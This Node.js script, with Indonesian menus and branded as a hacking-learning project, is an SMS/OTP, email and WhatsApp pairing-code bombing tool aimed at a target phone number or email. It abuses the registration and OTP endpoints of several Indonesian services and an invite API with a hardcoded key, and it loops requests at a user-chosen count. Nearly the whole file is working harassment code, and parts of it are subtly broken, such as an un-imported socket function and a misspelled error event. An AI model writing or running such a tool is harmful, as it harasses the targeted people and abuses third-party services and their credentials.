const pino = require('pino');
const { Boom } = require('@hapi/boom');
const fs = require('fs');
const chalk = require('chalk');
const FileType = require('file-type');
const path = require('path');
const axios = require('axios');
const _ = require('lodash');
const moment = require('moment-timezone');
const PhoneNumber = require('awesome-phonenumber');
const {
  default: spamConnect,
  delay,
  PHONENUMBER_MCC,
  makeCacheableSignalKeyStore,
  useMultiFileAuthState,
  DisconnectReason,
  fetchLatestBaileysVersion,
  generateForwardMessageContent,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  generateMessageID,
  downloadContentFromMessage,
  makeInMemoryStore,
  jidDecode,
  proto,
  Browsers
} = require('@whiskeysockets/baileys');

const NodeCache = require('node-cache');
const Pino = require('pino');
const readline = require('readline');

const store = makeInMemoryStore({
  logger: pino().child({ level: 'silent', stream: 'store' })
});

const pairingCode = true;
const useMobile = process.argv.includes('--mobile');

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

const question = (q) => new Promise((resolve) => rl.question(q, resolve));

function banner() {
  console.log(chalk.cyan('╔══════════════════════════════════════════════════════╗'));
  console.log(chalk.cyan('║') + chalk.red('   ██████╗  ██████╗ ██╗███████╗██╗  ██╗    ') + chalk.cyan('║'));
  console.log(chalk.cyan('║') + chalk.red('   ██╔══██╗██╔═══██╗██║██╔════╝╚██╗██╔╝    ') + chalk.cyan('║'));
  console.log(chalk.cyan('║') + chalk.red('   ██║  ██║██║   ██║██║███████╗ ╚███╔╝     ') + chalk.cyan('║'));
  console.log(chalk.cyan('║') + chalk.red('   ██║  ██║██║   ██║██║╚════██║ ██╔██╗     ') + chalk.cyan('║'));
  console.log(chalk.cyan('║') + chalk.red('   ██████╔╝╚██████╔╝██║███████║██╔╝ ██╗    ') + chalk.cyan('║'));
  console.log(chalk.cyan('║') + chalk.red('   ╚═════╝  ╚═════╝ ╚═╝╚══════╝╚═╝  ╚═╝    ') + chalk.cyan('║'));
  console.log(chalk.cyan('╠══════════════════════════════════════════════════════╣'));
  console.log(chalk.cyan('║') + chalk.yellow('              DOISXPROJECT                    ') + chalk.cyan('║'));
  console.log(chalk.cyan('║') + chalk.green('         "Belajar Hacker Dengan DoisX"        ') + chalk.cyan('║'));
  console.log(chalk.cyan('╚══════════════════════════════════════════════════════╝'));
  console.log('');
}

function menu() {
  console.log(chalk.magenta('┌──────────────────────────────────────────────────────┐'));
  console.log(chalk.magenta('│') + chalk.white('                     MENU UTAMA                    ') + chalk.magenta('│'));
  console.log(chalk.magenta('├──────────────────────────────────────────────────────┤'));
  console.log(chalk.magenta('│') + chalk.white('  [1] ') + chalk.green('SPAM OTP (BUGS)') + chalk.magenta('                        │'));
  console.log(chalk.magenta('│') + chalk.white('  [2] ') + chalk.green('SPAM EMAIL') + chalk.magenta('                           │'));
  console.log(chalk.magenta('│') + chalk.white('  [3] ') + chalk.green('SPAM PAIRING') + chalk.magenta('                        │'));
  console.log(chalk.magenta('│') + chalk.white('  [4] ') + chalk.red('KELUAR') + chalk.magenta('                             │'));
  console.log(chalk.magenta('└──────────────────────────────────────────────────────┘'));
  console.log('');
}

async function spamPairing() {
  console.clear();
  banner();
  console.log(chalk.yellow('╔══════════════════════════════════════════════════════╗'));
  console.log(chalk.yellow('║                 SPAM PAIRING CODE                   ║'));
  console.log(chalk.yellow('╚══════════════════════════════════════════════════════╝'));
  console.log('');

  const { state, saveCreds } = await useMultiFileAuthState('./Sanzz');
  const msgRetryCounterCache = new NodeCache();

  const sock = makeWASocket({
    logger: pino({ level: 'silent' }),
    printQRInTerminal: !pairingCode,
    browser: Browsers.firefox('Desktop'),
    auth: {
      creds: state.creds,
      keys: makeCacheableSignalKeyStore(state.keys, Pino({ level: 'fatal' }).child({ level: 'fatal' }))
    },
    markOnlineOnConnect: true,
    generateHighQualityLinkPreview: true,
    getMessage: async (key) => {
      if (store) {
        const msg = await store.loadMessage(key.remoteJid, key.id);
        return msg.message || undefined;
      }
      return { conversation: 'SPAM PAIRING CODE' };
    },
    msgRetryCounterCache: msgRetryCounterCache,
    defaultQueryTimeoutMs: undefined
  });

  store.bind(sock.ev);

  if (pairingCode && !sock.authState.creds.registered) {
    let nomor = await question(chalk.green('┌─[ MASUKKAN NOMOR TARGET ]\n└──► '));
    nomor = nomor.replace(/[^0-9]/g, '');

    while (!Object.values(PHONENUMBER_MCC).some(kode => nomor.startsWith(kode))) {
      console.log(chalk.red('Nomor tidak valid!'));
      nomor = await question(chalk.green('┌─[ MASUKKAN NOMOR TARGET ]\n└──► '));
      nomor = nomor.replace(/[^0-9]/g, '');
    }

    let jumlah = await question(chalk.green('┌─[ JUMLAH SPAM ]\n└──► '));
    jumlah = parseInt(jumlah) || 5;

    console.log('');
    console.log(chalk.yellow('┌──────────────────────────────────────────────────────┐'));
    console.log(chalk.yellow('│') + chalk.white('  TARGET : ') + chalk.green(nomor) + chalk.yellow('                        │'));
    console.log(chalk.yellow('│') + chalk.white('  TOTAL  : ') + chalk.green(jumlah) + chalk.yellow('                        │'));
    console.log(chalk.yellow('└──────────────────────────────────────────────────────┘'));
    console.log('');

    let berhasil = 0;
    let gagal = 0;

    for (let i = 0; i < jumlah; i++) {
      try {
        let pairCode = await sock.requestPairingCode(nomor);
        pairCode = pairCode?.match(/.{1,4}/g)?.join('-') || pairCode;
        berhasil++;
        console.log(chalk.green(`[${i+1}/${jumlah}] KODE: ${pairCode}`));
      } catch (e) {
        gagal++;
        console.log(chalk.red(`[${i+1}/${jumlah}] GAGAL: ${e.message}`));
      }
      await new Promise(resolve => setTimeout(resolve, 3000));
    }

    console.log('');
    console.log(chalk.yellow('┌──────────────────────────────────────────────────────┐'));
    console.log(chalk.yellow('│') + chalk.white('  BERHASIL : ') + chalk.green(berhasil) + chalk.yellow('                    │'));
    console.log(chalk.yellow('│') + chalk.white('  GAGAL    : ') + chalk.red(gagal) + chalk.yellow('                    │'));
    console.log(chalk.yellow('└──────────────────────────────────────────────────────┘'));
    console.log('');

    await question(chalk.gray('Tekan Enter untuk kembali...'));
    utama();
  }
}

async function spamOTP() {
  console.clear();
  banner();
  console.log(chalk.yellow('╔══════════════════════════════════════════════════════╗'));
  console.log(chalk.yellow('║              SPAM OTP WHATSAPP                     ║'));
  console.log(chalk.yellow('╚══════════════════════════════════════════════════════╝'));
  console.log('');

  let nomor = await question(chalk.green('┌─[ MASUKKAN NOMOR TARGET ]\n└──► '));
  nomor = nomor.replace(/[^0-9]/g, '');

  let jumlah = await question(chalk.green('┌─[ JUMLAH SPAM ]\n└──► '));
  jumlah = parseInt(jumlah) || 5;

  console.log(chalk.yellow('┌──────────────────────────────────────────────────────┐'));
  console.log(chalk.yellow('│') + chalk.white('  TARGET : ') + chalk.green(nomor) + chalk.yellow('                        │'));
  console.log(chalk.yellow('│') + chalk.white('  TOTAL  : ') + chalk.green(jumlah) + chalk.yellow('                        │'));
  console.log(chalk.yellow('└──────────────────────────────────────────────────────┘'));
  console.log('');

  let berhasil = 0;
  let gagal = 0;

  for (let i = 0; i < jumlah; i++) {
    console.log(chalk.gray(`[${i+1}/${jumlah}] Mengirim...`));

    try {
      const r = await axios.post('https://internetrakyat.id/api/app/auth/send-otp-register',
        { phone_number: nomor },
        { headers: { 'x-api-key': '280999!FTTH' } }
      );
      if (r.data.message === 'OTP terkirim') {
        berhasil++;
        console.log(chalk.green(`  InternetRakyat: OTP terkirim`));
      }
    } catch (e) {
      gagal++;
      console.log(chalk.red(`  InternetRakyat: Gagal`));
    }

    try {
      const r = await axios.post('https://www.bonusbelanja.com/api/auth/registration/app',
        { phone: nomor, name: 'dois', agreeTnc: true, agreeContact: true }
      );
      if (r.data.error === false) {
        berhasil++;
        console.log(chalk.green(`  BonusBelanja: Berhasil`));
      }
    } catch (e) {
      gagal++;
      console.log(chalk.red(`  BonusBelanja: Gagal`));
    }

    try {
      const query = 'query OTPRequest($otpType: String!, $mode: String, $msisdn: String, $email: String, $otpDigit: Int, $ValidateToken: String, $UserIDEnc: String, $UserIDSigned: String, $Signature: String, $MsisdnEnc: String, $EmailEnc: String, $source: String) {\n  OTPRequest: OTPRequestV2(otpType: $otpType, mode: $mode, msisdn: $msisdn, email: $email, otpDigit: $otpDigit, ValidateToken: $ValidateToken, UserIDEnc: $UserIDEnc, UserIDSigned: $UserIDSigned, Signature: $Signature, MsisdnEnc: $MsisdnEnc, EmailEnc: $EmailEnc, source: $source) {\n    success\n    message\n    errorMessage\n    sse_session_id\n    list_device_receiver\n    error_code\n    message_title\n    message_sub_title\n    message_img_link\n    __typename\n  }\n}';
      const payload = [{
        operationName: 'OTPRequest',
        variables: {
          msisdn: nomor,
          MsisdnEnc: '',
          EmailEnc: '',
          otpType: '116',
          mode: 'whatsapp',
          otpDigit: 6
        },
        query: query
      }];
      const r = await axios.post('https://gql.tokopedia.com/graphql/OTPRequest', payload, {
        headers: {
          'x-tkpd-lite-service': 'oauthx',
          'x-version': '04f884c'
        }
      });
      if (r.data[0]?.data?.OTPRequest?.success === true) {
        berhasil++;
        console.log(chalk.green(`  Tokopedia: OTP terkirim`));
      }
    } catch (e) {
      gagal++;
      console.log(chalk.red(`  Tokopedia: Gagal`));
    }

    await new Promise(resolve => setTimeout(resolve, 2000));
  }

  console.log('');
  console.log(chalk.yellow('┌──────────────────────────────────────────────────────┐'));
  console.log(chalk.yellow('│') + chalk.white('  BERHASIL : ') + chalk.green(berhasil) + chalk.yellow('                    │'));
  console.log(chalk.yellow('│') + chalk.white('  GAGAL    : ') + chalk.red(gagal) + chalk.yellow('                    │'));
  console.log(chalk.yellow('└──────────────────────────────────────────────────────┘'));
  console.log('');

  await question(chalk.gray('Tekan Enter untuk kembali...'));
  utama();
}

async function spamEmail() {
  console.clear();
  banner();
  console.log(chalk.yellow('╔══════════════════════════════════════════════════════╗'));
  console.log(chalk.yellow('║                  SPAM EMAIL                       ║'));
  console.log(chalk.yellow('╚══════════════════════════════════════════════════════╝'));
  console.log('');

  let email = await question(chalk.green('┌─[ MASUKKAN EMAIL TARGET ]\n└──► '));

  let jumlah = await question(chalk.green('┌─[ JUMLAH SPAM ]\n└──► '));
  jumlah = parseInt(jumlah) || 5;

  console.log(chalk.yellow('┌──────────────────────────────────────────────────────┐'));
  console.log(chalk.yellow('│') + chalk.white('  TARGET : ') + chalk.green(email) + chalk.yellow('                        │'));
  console.log(chalk.yellow('│') + chalk.white('  TOTAL  : ') + chalk.green(jumlah) + chalk.yellow('                        │'));
  console.log(chalk.yellow('└──────────────────────────────────────────────────────┘'));
  console.log('');

  let berhasil = 0;
  let gagal = 0;

  for (let i = 0; i < jumlah; i++) {
    try {
      const r = await axios.post('https://api.agentfy.ai/v1/beta', {
        name: email,
        email: email,
        website: 'https://google.com',
        company: 'bisnis',
        role: 'member'
      }, {
        headers: {
          'api-key': 'secret-a9387bc0-ff57-4d94-957d-fe2e44e06412',
          'agent-id': 'agent-6c5d5cbf-f100-43d9-b1f0-862dc3d578a2'
        }
      });
      if (r.status === 201) {
        berhasil++;
        console.log(chalk.green(`[${i+1}/${jumlah}] Invite code terkirim`));
      } else {
        gagal++;
        console.log(chalk.red(`[${i+1}/${jumlah}] Gagal`));
      }
    } catch (e) {
      gagal++;
      console.log(chalk.red(`[${i+1}/${jumlah}] Error: ${e.message}`));
    }
    await new Promise(resolve => setTimeout(resolve, 1000));
  }

  console.log('');
  console.log(chalk.yellow('┌──────────────────────────────────────────────────────┐'));
  console.log(chalk.yellow('│') + chalk.white('  BERHASIL : ') + chalk.green(berhasil) + chalk.yellow('                    │'));
  console.log(chalk.yellow('│') + chalk.white('  GAGAL    : ') + chalk.red(gagal) + chalk.yellow('                    │'));
  console.log(chalk.yellow('└──────────────────────────────────────────────────────┘'));
  console.log('');

  await question(chalk.gray('Tekan Enter untuk kembali...'));
  utama();
}

async function utama() {
  console.clear();
  banner();
  menu();

  let pilihan = await question(chalk.green('┌─[ PILIH MENU ]\n└──► '));

  if (pilihan === '1') {
    await spamOTP();
  } else if (pilihan === '2') {
    await spamEmail();
  } else if (pilihan === '3') {
    await spamPairing();
  } else if (pilihan === '4') {
    console.log(chalk.red('\nKeluar dari sistem...'));
    process.exit(0);
  } else {
    console.log(chalk.red('Pilihan tidak valid!'));
    await new Promise(resolve => setTimeout(resolve, 1000));
    utama();
  }
}

process.on('uncaughtexception', function(err) {
  let pesanError = String(err);
  if (pesanError.includes('conflict')) return;
  if (pesanError.includes('not-authorized')) return;
  if (pesanError.includes('rate-overlimit')) return;
  if (pesanError.includes('already-exists')) return;
  if (pesanError.includes('Timed Out')) return;
  if (pesanError.includes('Socket connection timeout')) return;
  if (pesanError.includes('Value not found')) return;
  console.log('Terjadi error:', err);
});

utama();
